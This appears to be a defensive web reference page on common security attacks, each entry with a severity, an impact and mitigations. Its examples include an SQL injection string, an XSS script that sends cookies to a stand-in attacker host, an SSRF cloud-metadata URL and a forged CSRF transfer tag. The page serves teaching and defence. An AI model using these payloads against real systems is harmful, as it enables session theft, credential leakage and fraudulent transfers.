Identity & Access Attacks

Credential Stuffing & Brute Force

High
Automated bots test leaked password pairs or guess combinations systematically to hijack user sessions.
Real World Impact

Unauthorized user hijack, automated account takeover (ATO), and sensitive information leakage.

Defensive Mitigations
  • Enforce Multi-Factor Authentication (MFA)
  • Implement rate limiting on authentication routes
  • Deploy Google CAPTCHAs or security tokens
  • Analyze anomalous geo-IP source logins

  • Secure Active Directory service tickets hashes
  • Deploy alerts for unusual Kerberos tickets

Privilege Escalation

Critical
Abuse of kernel vulnerabilities or misconfigurations to elevate limited permissions to root/administrator level access.
Real World Impact

Attacker gains absolute control over the machine, installs system services, and turns off telemetry logging.

Defensive Mitigations
  • Enforce the Principle of Least Privilege (PoLP)
  • Regularly scan and patch operating system software
  • Monitor registry alterations and task scheduler edits
  • Audit system service configuration parameters

Session Hijacking

High
Threat actors steal authenticated session state cookies to access systems pretending to be the user, bypassing authentication check loops.
Real World Impact

Unauthorized database access, session impersonation, and multi-factor auth bypassing.

Defensive Mitigations
  • Enforce Secure and HttpOnly cookie attribute flags
  • Bind session tokens to device fingerprint profiles
  • Implement short cookie session expire timeouts
  • Monitor IP changes during active sessions

Application-Layer & Web Vulnerabilities

SQL Injection (SQLi)

Critical
Unsanitized parameters passed into user inputs are executed by database servers as commands.
Real World Example

Bypassing credentials panels by inputting ' OR 1=1 -- in form username blocks.

Defensive Mitigations
  • Enforce prepared parameterized query templates
  • Filter input fields against regex patterns
  • Restrict database user privilege attributes

Cross-Site Scripting (XSS)

High
Attackers inject malicious client-side JavaScript payloads into pages loaded by other user browsers.
Real World Example

Posting comment posts containing <script>fetch(attacker_ip + document.cookie)</script> to hijack sessions.

Defensive Mitigations
  • Sanitize output variables with HTML Entity encoding
  • Deploy strict Content Security Policy headers
  • Store sessions cookies as HttpOnly

Broken Object Level Authorization (BOLA / IDOR)

Critical
API handlers fail to verify user resource access rights when processing variable IDs in request parameters.
Real World Example

Changing API call endpoint targets from /invoice/1001 to /invoice/1002 to inspect other records.

Defensive Mitigations
  • Enforce session ownership validation checkpoints
  • Utilize complex non-sequential UUID parameters
  • Perform automated API test access scans

Server-Side Request Forgery (SSRF)

Critical
A web application is forced to dispatch server requests targeting internal files or metadata systems.
Real World Example

Passing http://169.254.169.254/latest/meta-data/ to cloud document builders to leak credentials.

Defensive Mitigations
  • Enforce URL destination domain whitelists
  • Restrict HTTP redirections in curl requests
  • Isolate backend microservices inside private networks

Cross-Site Request Forgery (CSRF)

Medium
Tricking authenticated client browsers into sending unauthorized state-changing requests to vulnerable web portals.
Real World Example

Inserting <img src="http://bank.com/transfer?to=attacker&amount=1000"> in forums to trigger cash transfers.

Defensive Mitigations
  • Enforce random session-bound Anti-CSRF tokens
  • Configure SameSite cookie attributes (Strict/Lax)
  • Implement secondary re-auth checks for payments

Network & Infrastructure Attacks

DDoS (Distributed Denial of Service)

Critical
A network of compromised nodes floods host ports or processing capacity to trigger system downtime outages.
Real World Impact

Extended operational service crashes and financial loss due to system unavailability.

Defensive Mitigations
  • Implement edge rate limit throttling
  • Use Cloudflare CDN proxy caches
  • Deploy packet scrubbing center nodes
Attack Flow Diagram

Man-in-the-Middle (MitM)

High
Threat actors intercept and alter network communications between two machines silently.
Real World Impact

Stealing sensitive credentials, private communication leakage, and transaction defacement.

Defensive Mitigations
  • Enforce SSL/TLS encryption across all APIs
  • Use HTTP Strict Transport Security (HSTS)
  • Ban usage of unencrypted public Wi-Fi profiles
Attack Flow Diagram

DNS Spoofing / Cache Poisoning

High
Injecting malicious name server cache values to redirect requests to clone phishing pages.
Real World Impact

Redirection of web traffic to clone portals to capture login tokens and credit card details.

Defensive Mitigations
  • Enforce Domain Name System Security Extensions (DNSSEC)
  • Restrict recursive queries on DNS infrastructure
  • Configure encrypted DNS routing (DoH/DoT)
Attack Flow Diagram

Rogue Access Points

Medium
Malicious operators spin up rogue Wi-Fi signals in office perimeters to capture corporate packets.
Real World Impact

Intercepting plaintext traffic logs and session cookies of client devices within Wi-Fi ranges.

Defensive Mitigations
  • Enforce Wireless Intrusion Prevention Systems (WIPS)
  • Perform periodic hardware frequency audits
  • Mandate enterprise VPN connections for all clients

Cloud & Virtualization Attacks

Cloud Misconfiguration

Critical
Insecure parameters setup in cloud environments (e.g. open S3 buckets, permissive security groups).
Exposure Level

Public exposure of database dumps and cloud resources to anonymous network sweeps.

Recommended Controls
  • Deploy Cloud Security Posture Management (CSPM) audits
  • Enforce private-by-default parameters on cloud stores
  • Perform automated IAM permissions sweeps

API Key / Secret Leakage

High
Accidental commit check-in of API authorization keys, credentials, or private files to code repositories.
Exposure Level

Attacker scans public repositories to hijack billing accounts and cloud resources instantly.

Recommended Controls
  • Configure pre-commit git secret scanners hooks
  • Employ KMS and dynamic secrets rotation stores
  • Never commit credentials; pull from OS env
